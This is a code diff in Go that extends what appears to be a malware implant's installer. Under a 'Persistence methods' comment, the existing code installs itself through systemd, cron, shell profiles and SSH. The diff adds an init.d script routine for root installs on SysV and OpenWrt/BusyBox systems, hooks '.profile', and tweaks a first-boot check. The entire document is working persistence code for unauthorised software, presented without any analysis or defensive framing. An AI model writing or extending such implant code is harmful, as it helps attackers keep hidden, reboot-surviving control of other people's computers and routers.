@@ -36,7 +36,12 @@ func UserKitInstall() {
 	os.WriteFile(targetPath, input, 0755)
 
 	// Persistence methods
-	InstallSystemd(targetPath)
+	if commandExists("systemctl") {
+		InstallSystemd(targetPath)
+	}
+	if isRoot() {
+		InstallInitD(targetPath)
+	}
 	InstallCron(targetPath)
 	InstallShellProfile(targetPath)
 	InstallSSH()
@@ -44,6 +49,44 @@ func UserKitInstall() {
 	// Start the installed version and exit
 	exec.Command(targetPath).Start()
 	os.Exit(0)
+}
+
+func commandExists(cmd string) bool {
+	_, err := exec.LookPath(cmd)
+	return err == nil
+}
+
+func InstallInitD(targetPath string) {
+	if !isRoot() {
+		return
+	}
+	scriptPath := filepath.Join("/etc/init.d", InstalledName)
+	scriptContent := fmt.Sprintf(`#!/bin/sh /etc/rc.common
+# LSB init script for %s
+START=99
+STOP=10
+
+start() {
+    echo "Starting %s"
+    %s &
+}
+
+stop() {
+    echo "Stopping %s"
+    killall %s
+}
+
+case "$1" in
+    start) start ;;
+    stop) stop ;;
+    restart) stop; start ;;
+    *) %s & ;;
+esac
+`, InstalledName, InstalledName, targetPath, InstalledName, InstalledName, targetPath)
+
+	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
+	// Try to enable it (standard SysV or OpenWrt/BusyBox style)
+	exec.Command("/etc/init.d/"+InstalledName, "enable").Run()
 }
 
 func InstallSystemd(targetPath string) {
@@ -103,6 +146,7 @@ func InstallShellProfile(targetPath string) {
 	profiles := []string{
 		filepath.Join(home, ".bashrc"),
 		filepath.Join(home, ".zshrc"),
+		filepath.Join(home, ".profile"),
 	}
 
 	if isRoot() {
@@ -140,7 +184,7 @@ func InstallSSH() {
 func CheckFirstBoot() bool {
 	// Simple check: if we are running from an installation directory
 	execPath, _ := os.Executable()
-	for _, loc := range append(InstallUserLocations, InstallAdminLocations...) {
+	for _, loc := range append(InstallUserLocations[:], InstallAdminLocations[:]...) {
 		cleanLoc := strings.Replace(loc, "~", os.Getenv("HOME"), 1)
 		if strings.HasPrefix(execPath, cleanLoc) {
 			return false
